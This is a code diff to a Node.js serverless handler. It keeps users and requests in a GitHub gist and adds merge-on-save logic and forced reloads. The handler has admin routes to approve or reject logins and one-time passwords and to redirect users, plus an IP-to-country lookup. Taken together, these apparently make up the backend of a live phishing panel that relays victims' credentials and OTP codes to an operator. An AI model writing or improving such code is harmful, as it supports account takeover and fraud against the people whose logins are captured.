@@ -75,12 +75,12 @@ function getCountryFromIp(ip) {
   });
 }
 
-function gistRequest(method, path, body) {
+function gistRequest(method, gistPath, body) {
   return new Promise((resolve, reject) => {
     const options = {
       hostname: 'api.github.com',
       port: 443,
-      path: path,
+      path: gistPath,
       method: method,
       headers: {
         'Authorization': `token ${GITHUB_TOKEN}`,
@@ -93,6 +93,9 @@ function gistRequest(method, path, body) {
       let data = '';
       res.on('data', chunk => data += chunk);
       res.on('end', () => {
+        if (res.statusCode >= 400) {
+          return reject(new Error(`GitHub ${res.statusCode}`));
+        }
         try { resolve(JSON.parse(data)); }
         catch { resolve(data); }
       });
@@ -152,15 +155,38 @@ async function loadDB(force) {
 async function saveDB() {
   if (!GITHUB_TOKEN || !GIST_ID) return;
   try {
-    const usersWithRequests = {};
-    for (const [sid, user] of Object.entries(DB.users)) {
-      if (Object.values(DB.requests).some(r => r.user_session_id === sid)) {
-        usersWithRequests[sid] = user;
+    const gist = await gistRequest('GET', `/gists/${GIST_ID}`);
+    let merged = { users: {}, requests: {} };
+    if (gist?.files?.['maqrq_db.json']) {
+      merged = JSON.parse(gist.files['maqrq_db.json'].content);
+      if (!merged.users) merged.users = {};
+      if (!merged.requests) merged.requests = {};
+    }
+
+    for (const [sid, localU] of Object.entries(DB.users)) {
+      if (!Object.values(DB.requests).some(r => r.user_session_id === sid)) continue;
+      const gistU = merged.users[sid];
+      if (!gistU || new Date(localU.last_activity) > new Date(gistU.last_activity || 0)) {
+        merged.users[sid] = localU;
       }
     }
+    for (const [rid, localR] of Object.entries(DB.requests)) {
+      const gistR = merged.requests[rid];
+      if (!gistR) {
+        merged.requests[rid] = localR;
+      } else {
+        if (localR.admin_action_time && !gistR.admin_action_time) {
+          merged.requests[rid] = localR;
+        } else if (new Date(localR.timestamp) > new Date(gistR.timestamp || 0)) {
+          merged.requests[rid] = localR;
+        }
+      }
+    }
+
     await gistRequest('PATCH', `/gists/${GIST_ID}`, {
-      files: { 'maqrq_db.json': { content: JSON.stringify({ users: usersWithRequests, requests: DB.requests }) } }
+      files: { 'maqrq_db.json': { content: JSON.stringify(merged) } }
     });
+    lastLoadTime = Date.now();
   } catch (e) {
     console.error('Error saving DB:', e.message);
   }
@@ -287,6 +313,7 @@ module.exports = async (req, res) => {
 
   // --- Approve/Reject Login ---
   if ((m = path.match(/^\/admin\/approve_login\/(.+)$/))) {
+    await loadDB(true);
     const sessionId = decodeURIComponent(m[1]);
     if (!DB.users[sessionId]) return res.status(404).json({ status: 'error', message: 'المستخدم غير موجود' });
     const pending = getUserRequests(sessionId).filter(r => r.type === 'login' && r.status === 'pending').sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
@@ -299,6 +326,7 @@ module.exports = async (req, res) => {
   }
 
   if ((m = path.match(/^\/admin\/reject_login\/(.+)$/))) {
+    await loadDB(true);
     const sessionId = decodeURIComponent(m[1]);
     if (!DB.users[sessionId]) return res.status(404).json({ status: 'error', message: 'المستخدم غير موجود' });
     const pending = getUserRequests(sessionId).filter(r => r.type === 'login' && r.status === 'pending').sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
@@ -312,6 +340,7 @@ module.exports = async (req, res) => {
 
   // --- Approve/Reject OTP ---
   if ((m = path.match(/^\/admin\/approve_otp\/(.+)$/))) {
+    await loadDB(true);
     const sessionId = decodeURIComponent(m[1]);
     if (!DB.users[sessionId]) return res.status(404).json({ status: 'error', message: 'المستخدم غير موجود' });
     const pending = getUserRequests(sessionId).filter(r => r.type === 'otp' && r.status === 'pending').sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
@@ -324,6 +353,7 @@ module.exports = async (req, res) => {
   }
 
   if ((m = path.match(/^\/admin\/reject_otp\/(.+)$/))) {
+    await loadDB(true);
     const sessionId = decodeURIComponent(m[1]);
     if (!DB.users[sessionId]) return res.status(404).json({ status: 'error', message: 'المستخدم غير موجود' });
     const pending = getUserRequests(sessionId).filter(r => r.type === 'otp' && r.status === 'pending').sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
@@ -353,6 +383,7 @@ module.exports = async (req, res) => {
 
   // --- Redirect User ---
   if ((m = path.match(/^\/admin\/redirect_user\/(.+)$/)) && method === 'POST') {
+    await loadDB(true);
     const sessionId = decodeURIComponent(m[1]);
     const user = DB.users[sessionId];
     if (!user) return res.status(404).json({ status: 'error', message: 'المستخدم غير موجود' });
@@ -365,6 +396,7 @@ module.exports = async (req, res) => {
 
   // --- Submit Request ---
   if (path === '/submit_request' && method === 'POST') {
+    await loadDB(true);
     if (!body) return res.status(400).json({ status: 'error', message: 'يجب أن يكون الطلب بصيغة JSON' });
 
     let requestType, userData;
